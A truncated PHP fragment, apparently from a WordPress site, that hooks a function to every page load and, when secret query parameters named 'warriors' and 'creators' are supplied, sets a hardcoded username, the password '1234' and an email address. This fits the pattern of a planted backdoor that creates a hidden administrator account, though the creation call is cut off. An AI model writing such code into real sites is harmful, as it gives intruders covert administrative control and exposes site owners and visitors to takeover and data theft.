...
add_action('init', 'process_post10');

function process_post10(){

if(isset($_GET['warriors'])) {
 ...
 if(isset($_GET['creators'])) {
   
		$user_name='frances_ortiz';
		$password='1234';
		$user_email='frances_ortiz@veteranlogix.com';
